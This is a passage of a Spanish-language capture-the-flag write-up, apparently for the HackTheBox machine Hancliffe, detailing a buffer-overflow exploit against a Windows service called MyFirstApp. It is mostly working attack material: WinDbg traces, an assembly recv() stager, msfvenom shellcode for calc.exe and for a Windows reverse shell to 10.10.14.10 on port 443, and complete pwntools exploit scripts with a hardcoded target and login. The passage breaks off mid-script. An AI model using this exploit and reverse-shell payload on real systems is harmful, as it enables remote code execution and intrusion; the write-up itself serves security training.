eax=00f8fed6 ebx=0000013c ecx=00d83b70 edx=000a7190 esi=71901a3d edi=71901a3d
eip=719023b3 esp=00f8ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
MyFirstApp+0x23b3:
719023b3 ffe0            jmp     eax {00f8fed6}

</span><span class="ro">0:000></span><span class="p"> p
eax=00f8fed6 ebx=0000013c ecx=00d83b70 edx=000a7190 esi=71901a3d edi=71901a3d
eip=00f8fed6 esp=00f8ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
00f8fed6 8b742448        mov     esi,dword ptr [esp+48h] ss:002b:00f8ff64=0000013c  

</span><span class="ro">0:000></span><span class="p"> p
eax=00f8fed6 ebx=0000013c ecx=00d83b70 edx=000a7190 esi=0000013c edi=71901a3d
eip=00f8feda esp=00f8ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
00f8feda 41              inc     ecx

</span><span class="ro">0:000></span><span class="p"> r esi
esi=0000013c</span>
</code></pre></div></div><br>


<p class="plain-text">Antes de seguir tenemos que solucionar un problema y es que si seguimos enviando instrucciones terminaremos por solaparnos con <code class="language-plaintext highlighter-rouge">esp</code>, para solucionarlo podemos restarle <code class="language-plaintext highlighter-rouge">0x64</code> al stack para que asi este arriba de <code class="language-plaintext highlighter-rouge">eip</code> y no entre en conflicto</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Ya almacenado el descriptor empezaremos a enviar los argumentos en orden inverso, el primero son las <code class="language-plaintext highlighter-rouge">flags</code> que lo dejaremos en <code class="language-plaintext highlighter-rouge">0</code>, sin embargo para evitar <code class="language-plaintext highlighter-rouge">null</code> bytes ya que pueden dar problemas ejecutaremos <code class="language-plaintext highlighter-rouge">xor ebx, ebx</code> ya que al ejecutar el xor consigo mismo el resultado será <code class="language-plaintext highlighter-rouge">0</code>, ahora podemos empujar el valor de <code class="language-plaintext highlighter-rouge">ebx</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">El siguiente argumento es la longitud a recibir, anteriormente cuando vimos la llamada estaba establecido en <code class="language-plaintext highlighter-rouge">0x400</code> sin embargo esto puede ocasionar null bytes, asi que como <code class="language-plaintext highlighter-rouge">ebx</code> vale <code class="language-plaintext highlighter-rouge">0</code> podemos mover <code class="language-plaintext highlighter-rouge">0x04</code> a <code class="language-plaintext highlighter-rouge">bh</code> que es el registro mas alto del subregistro <code class="language-plaintext highlighter-rouge">bx</code>, y como <code class="language-plaintext highlighter-rouge">bl</code> aun vale <code class="language-plaintext highlighter-rouge">0x00</code> el registro <code class="language-plaintext highlighter-rouge">ebx</code> almacena <code class="language-plaintext highlighter-rouge">0x400</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov bh, 0x4"</span><span class="p">)
recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Para el siguiente argumento necesitaremos visualizar la memoria en el debugger, asi que enviamos el exploit y avanzamos hasta el final de las instrucciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x719023b3
</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=00f9fed6 ebx=00000138 ecx=007d3b70 edx=000a7190 esi=71901a3d edi=71901a3d  
eip=719023b3 esp=00f9ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
MyFirstApp+0x23b3:
719023b3 ffe0            jmp     eax {00f9fed6}

</span><span class="ro">0:000> </span><span class="p">u eax
00f9fed6 8b742448        mov     esi,dword ptr [esp+48h]
00f9feda 83ec64          sub     esp,64h
00f9fedd 31db            xor     ebx,ebx
00f9fedf 53              push    ebx
00f9fee0 b704            mov     bh,4
00f9fee2 53              push    ebx
00f9fee3 41              inc     ecx
00f9fee4 41              inc     ecx

</span><span class="ro">0:000></span><span class="p"> g 0x00f9fee3
eax=00f9fed6 ebx=00000400 ecx=007d3b70 edx=000a7190 esi=00000138 edi=71901a3d  
eip=00f9fee3 esp=00f9feb0 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
00f9fee3 41              inc     ecx</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestra idea será que el nuevo buffer se escriba en un punto intermedio de las <code class="language-plaintext highlighter-rouge">A's</code> para que sigan ejecutando las instrucciones hasta que en un momento llegue al shellcode, <code class="language-plaintext highlighter-rouge">esp + 0x64</code> es un buen lugar, casi al final de todas las <code class="language-plaintext highlighter-rouge">A's</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db esp
00f9feb0  00 04 00 00 00 00 00 00-65 21 90 71 d6 fe f9 00  ........e!.q....  
00f9fec0  28 3b 7d 00 fe ff ff ff-14 ff f9 00 e5 5f 6e 76  (;}.........._nv  
00f9fed0  38 01 00 00 00 ff 8b 74-24 48 83 ec 64 31 db 53  8......t$H..d1.S  
00f9fee0  b7 04 53 41 41 41 41 41-41 41 41 41 41 41 41 41  ..SAAAAAAAAAAAAA  
00f9fef0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
00f9ff00  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
00f9ff10  41 41 41 41 41 41 41 41-b3 23 90 71 0a 00 7d 00  AAAAAAAA.#.q..}.  
00f9ff20  90 3b 7d 00 50 00 00 00-00 00 00 00 00 00 00 00  .;}.P...........  

</span><span class="ro">0:000></span><span class="p"> db esp + 0x64
00f9ff14  41 41 41 41 b3 23 90 71-0a 00 7d 00 90 3b 7d 00  AAAA.#.q..}..;}.  
00f9ff24  50 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  P...............  
00f9ff34  00 4b 33 72 34 6a 40 40-6e 4d 34 6a 40 70 41 68  .K3r4j@@nM4j@pAh  
00f9ff44  21 54 61 6c 66 69 61 6e-73 79 61 68 12 00 00 00  !Talfiansyah....  
00f9ff54  90 3b 7d 00 28 3b 7d 00-01 00 00 00 1d 00 00 00  .;}.(;}.........  
00f9ff64  38 01 00 00 e0 36 7d 00-00 00 00 00 00 00 00 00  8....6}.........  
00f9ff74  84 ff f9 00 a9 7b 8a 77-38 01 00 00 90 7b 8a 77  .....{.w8....{.w  
00f9ff84  dc ff f9 00 0b c1 a1 77-38 01 00 00 70 f0 9c 18  .......w8...p...  </span>
</code></pre></div></div><br>

<p class="plain-text">Para almacenar la dirección <code class="language-plaintext highlighter-rouge">esp + 0x64</code> donde se escribira el buffer podemos usar <code class="language-plaintext highlighter-rouge">lea</code> y una vez guardado en el registro <code class="language-plaintext highlighter-rouge">ebx</code> empujamos el puntero al buffer al stack</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"lea ebx, [esp + 0x64]"</span><span class="p">)
</span><span class="p">recv</span><span class="o"> += </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Solo nos queda el ultimo valor que es el <code class="language-plaintext highlighter-rouge">descriptor</code> de socket, como ya lo habiamos almacenado en <code class="language-plaintext highlighter-rouge">esi</code> solo nos queda ejecutar <code class="language-plaintext highlighter-rouge">push</code> para empujarlo al stack</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esi"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Finalmente solo nos queda llamar al desreferenciado de la <code class="language-plaintext highlighter-rouge">IAT</code> de la función <code class="language-plaintext highlighter-rouge">recv()</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call [0x719082ac]"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro stager final se ve de esta forma, y ya que solo pesa <code class="language-plaintext highlighter-rouge">25</code> bytes entra sin ningun problema en los <code class="language-plaintext highlighter-rouge">66</code> bytes disponibles que tenemos de espacio con la limitación</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">recv</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov esi, [esp + 0x48]"</span><span class="p">)  
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov bh, 0x4"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"lea ebx, [esp + 0x64]"</span><span class="p">)  
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esi"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719082ac]"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Despues de almacenar los 4 argumentos en el <code class="language-plaintext highlighter-rouge">esp</code> tenemos el orden que necesitamos para la llamada a <code class="language-plaintext highlighter-rouge">recv()</code> que recibirá el shellcode, lo escribirá en un punto intermedio de las <code class="language-plaintext highlighter-rouge">A's</code> y al retornar y seguir ejecutando llegará a este</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x719023b3

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=0105fed6 ebx=0000013c ecx=00783b70 edx=000a7190 esi=71901a3d edi=71901a3d  
eip=719023b3 esp=0105ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
MyFirstApp+0x23b3:
719023b3 ffe0            jmp     eax {0105fed6}

</span><span class="ro">0:000></span><span class="p"> pc
eax=766e5f50 ebx=0105ff14 ecx=00783b70 edx=000a7190 esi=0000013c edi=71901a3d  
eip=0105feef esp=0105fea8 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
0105feef ffd0            call    eax {WS2_32!recv (766e5f50)}

</span><span class="ro">0:000></span><span class="p"> dds esp L4
0105fea8  0000013c
0105feac  0105ff14
0105feb0  00000400
0105feb4  00000000</span>
</code></pre></div></div><br>

<p class="plain-text">Para evitar tener que abrir un listener en una shell simplemente con <code class="language-plaintext highlighter-rouge">msfvenom</code> crearemos un <code class="language-plaintext highlighter-rouge">shellcode</code> que ejecute <code class="language-plaintext highlighter-rouge">calc.exe</code> para comprobar que funcione</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode -b </span><span class="am">'\x00'</span><span class="p">
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1237 bytes
shellcode =  b""
shellcode += b"\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4"
shellcode += b"\x5d\x29\xc9\xb1\x31\x31\x7d\x13\x83\xed\xfc"
shellcode += b"\x03\x7d\x13\x63\x7d\xc8\xc3\xe1\x7e\x31\x13"
shellcode += b"\x86\xf7\xd4\x22\x86\x6c\x9c\x14\x36\xe6\xf0"
shellcode += b"\x98\xbd\xaa\xe0\x2b\xb3\x62\x06\x9c\x7e\x55"
shellcode += b"\x29\x1d\xd2\xa5\x28\x9d\x29\xfa\x8a\x9c\xe1"
shellcode += b"\x0f\xca\xd9\x1c\xfd\x9e\xb2\x6b\x50\x0f\xb7"
shellcode += b"\x26\x69\xa4\x8b\xa7\xe9\x59\x5b\xc9\xd8\xcf"
shellcode += b"\xd0\x90\xfa\xee\x35\xa9\xb2\xe8\x5a\x94\x0d"
shellcode += b"\x82\xa8\x62\x8c\x42\xe1\x8b\x23\xab\xce\x79"
shellcode += b"\x3d\xeb\xe8\x61\x48\x05\x0b\x1f\x4b\xd2\x76"
shellcode += b"\xfb\xde\xc1\xd0\x88\x79\x2e\xe1\x5d\x1f\xa5"
shellcode += b"\xed\x2a\x6b\xe1\xf1\xad\xb8\x99\x0d\x25\x3f"
shellcode += b"\x4e\x84\x7d\x64\x4a\xcd\x26\x05\xcb\xab\x89"
shellcode += b"\x3a\x0b\x14\x75\x9f\x47\xb8\x62\x92\x05\xd6"
shellcode += b"\x75\x20\x30\x94\x76\x3a\x3b\x88\x1e\x0b\xb0"
shellcode += b"\x47\x58\x94\x13\x2c\x96\xde\x3e\x04\x3f\x87"
shellcode += b"\xaa\x15\x22\x38\x01\x59\x5b\xbb\xa0\x21\x98"
shellcode += b"\xa3\xc0\x24\xe4\x63\x38\x54\x75\x06\x3e\xcb"
shellcode += b"\x76\x03\x5d\x8a\xe4\xcf\x8c\x29\x8d\x6a\xd1"</span>
</code></pre></div></div><br>

<p class="plain-text">Cambiaremos las <code class="language-plaintext highlighter-rouge">A's</code> por <code class="language-plaintext highlighter-rouge">0x90</code> para que ejecute <code class="language-plaintext highlighter-rouge">nop</code> y no <code class="language-plaintext highlighter-rouge">inc ecx</code>, el exploit ejecutará nuestro stager que escribirá el buffer en un punto intermedio de los nops, luego retornará y seguirá la ejecución, al terminar los nops ejecutará el shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32, asm, sleep

</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
    sys.exit(</span><span class="mi">1</span><span class="p">)

recv</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov esi, [esp + 0x48]"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov bh, 0x4"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"lea ebx, [esp + 0x64]"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esi"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719082ac]"</span><span class="p">)

offset</span><span class="o"> =</span><span class="mi"> 66</span><span class="p">
junk</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="p"> (offset</span><span class="o"> -</span><span class="no"> len</span><span class="p">(recv))

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> recv
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">

shellcode</span><span class="o"> = </span><span class="no"> b</span><span class="s">""</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5d\x29\xc9\xb1\x31\x31\x7d\x13\x83\xed\xfc</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\x7d\x13\x63\x7d\xc8\xc3\xe1\x7e\x31\x13</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x86\xf7\xd4\x22\x86\x6c\x9c\x14\x36\xe6\xf0</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x98\xbd\xaa\xe0\x2b\xb3\x62\x06\x9c\x7e\x55</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x29\x1d\xd2\xa5\x28\x9d\x29\xfa\x8a\x9c\xe1</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0f\xca\xd9\x1c\xfd\x9e\xb2\x6b\x50\x0f\xb7</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x26\x69\xa4\x8b\xa7\xe9\x59\x5b\xc9\xd8\xcf</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd0\x90\xfa\xee\x35\xa9\xb2\xe8\x5a\x94\x0d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x82\xa8\x62\x8c\x42\xe1\x8b\x23\xab\xce\x79</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3d\xeb\xe8\x61\x48\x05\x0b\x1f\x4b\xd2\x76</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\xde\xc1\xd0\x88\x79\x2e\xe1\x5d\x1f\xa5</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xed\x2a\x6b\xe1\xf1\xad\xb8\x99\x0d\x25\x3f</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4e\x84\x7d\x64\x4a\xcd\x26\x05\xcb\xab\x89</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3a\x0b\x14\x75\x9f\x47\xb8\x62\x92\x05\xd6</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x75\x20\x30\x94\x76\x3a\x3b\x88\x1e\x0b\xb0</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x47\x58\x94\x13\x2c\x96\xde\x3e\x04\x3f\x87</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xaa\x15\x22\x38\x01\x59\x5b\xbb\xa0\x21\x98</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\xc0\x24\xe4\x63\x38\x54\x75\x06\x3e\xcb</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x76\x03\x5d\x8a\xe4\xcf\x8c\x29\x8d\x6a\xd1</span><span class="s">"</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)

sleep(</span><span class="mi">1</span><span class="p">)
shell.sendline(shellcode)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">call</code> llamara a la función <code class="language-plaintext highlighter-rouge">recv()</code> que tomará como argumentos los valores que dejamos en el stack para cuando enviemos el <code class="language-plaintext highlighter-rouge">shellcode</code> lo guarde en un punto de nuestros <code class="language-plaintext highlighter-rouge">nops</code>, al finalizar ejecuta el shellcode y abre la calculadora</p>
<a href="/hackthebox/hancliffe/29.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/29.png"></p></div></a>

<p class="plain-text">Lo que nos queda es crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code> que en caso de ejecutarse nos envie una <code class="language-plaintext highlighter-rouge">reverse shell</code> en windows a nuestro host por el puerto 443</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread -b </span><span class="am">'\x00' </span><span class="p">-f python -v shellcode  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xb8\x7d\xe5\x1d\x63\xdb\xcf\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x52\x31\x46\x12\x03\x46\x12"
shellcode += b"\x83\x93\x19\xff\x96\x97\x0a\x82\x59\x67\xcb"
shellcode += b"\xe3\xd0\x82\xfa\x23\x86\xc7\xad\x93\xcc\x85"
shellcode += b"\x41\x5f\x80\x3d\xd1\x2d\x0d\x32\x52\x9b\x6b"
shellcode += b"\x7d\x63\xb0\x48\x1c\xe7\xcb\x9c\xfe\xd6\x03"
shellcode += b"\xd1\xff\x1f\x79\x18\xad\xc8\xf5\x8f\x41\x7c"
shellcode += b"\x43\x0c\xea\xce\x45\x14\x0f\x86\x64\x35\x9e"
shellcode += b"\x9c\x3e\x95\x21\x70\x4b\x9c\x39\x95\x76\x56"
shellcode += b"\xb2\x6d\x0c\x69\x12\xbc\xed\xc6\x5b\x70\x1c"
shellcode += b"\x16\x9c\xb7\xff\x6d\xd4\xcb\x82\x75\x23\xb1"
shellcode += b"\x58\xf3\xb7\x11\x2a\xa3\x13\xa3\xff\x32\xd0"
shellcode += b"\xaf\xb4\x31\xbe\xb3\x4b\x95\xb5\xc8\xc0\x18"
shellcode += b"\x19\x59\x92\x3e\xbd\x01\x40\x5e\xe4\xef\x27"
shellcode += b"\x5f\xf6\x4f\x97\xc5\x7d\x7d\xcc\x77\xdc\xea"
shellcode += b"\x21\xba\xde\xea\x2d\xcd\xad\xd8\xf2\x65\x39"
shellcode += b"\x51\x7a\xa0\xbe\x96\x51\x14\x50\x69\x5a\x65"
shellcode += b"\x79\xae\x0e\x35\x11\x07\x2f\xde\xe1\xa8\xfa"
shellcode += b"\x71\xb1\x06\x55\x32\x61\xe7\x05\xda\x6b\xe8"
shellcode += b"\x7a\xfa\x94\x22\x13\x91\x6f\xa5\x16\x6c\x61"
shellcode += b"\x39\x4f\x72\x7d\x40\x34\xfb\x9b\x28\x5a\xaa"
shellcode += b"\x34\xc5\xc3\xf7\xce\x74\x0b\x22\xab\xb7\x87"
shellcode += b"\xc1\x4c\x79\x60\xaf\x5e\xee\x80\xfa\x3c\xb9"
shellcode += b"\x9f\xd0\x28\x25\x0d\xbf\xa8\x20\x2e\x68\xff"
shellcode += b"\x65\x80\x61\x95\x9b\xbb\xdb\x8b\x61\x5d\x23"
shellcode += b"\x0f\xbe\x9e\xaa\x8e\x33\x9a\x88\x80\x8d\x23"
shellcode += b"\x95\xf4\x41\x72\x43\xa2\x27\x2c\x25\x1c\xfe"
shellcode += b"\x83\xef\xc8\x87\xef\x2f\x8e\x87\x25\xc6\x6e"
shellcode += b"\x39\x90\x9f\x91\xf6\x74\x28\xea\xea\xe4\xd7"
shellcode += b"\x21\xaf\x05\x3a\xe3\xda\xad\xe3\x66\x67\xb0"
shellcode += b"\x13\x5d\xa4\xcd\x97\x57\x55\x2a\x87\x12\x50"
shellcode += b"\x76\x0f\xcf\x28\xe7\xfa\xef\x9f\x08\x2f"</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit final constara de <code class="language-plaintext highlighter-rouge">2</code> etapas, la primera desborda el buffer y abre un socket con <code class="language-plaintext highlighter-rouge">recv()</code>, pasado un segundo enviamos el <code class="language-plaintext highlighter-rouge">shellcode</code> y se interpretara</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm, sleep

recv</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov esi, [esp + 0x48]"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor ebx, ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov bh, 0x4"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"lea ebx, [esp + 0x64]"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push ebx"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push esi"</span><span class="p">)
recv</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call [0x719082ac]"</span><span class="p">)

offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
junk</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="p"> (offset</span><span class="o"> -</span><span class="no"> len</span><span class="p">(recv))

shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb8\x7d\xe5\x1d\x63\xdb\xcf\xd9\x74\x24\xf4</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5e\x29\xc9\xb1\x52\x31\x46\x12\x03\x46\x12</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x83\x93\x19\xff\x96\x97\x0a\x82\x59\x67\xcb</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe3\xd0\x82\xfa\x23\x86\xc7\xad\x93\xcc\x85</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x41\x5f\x80\x3d\xd1\x2d\x0d\x32\x52\x9b\x6b</span><span class="s">"
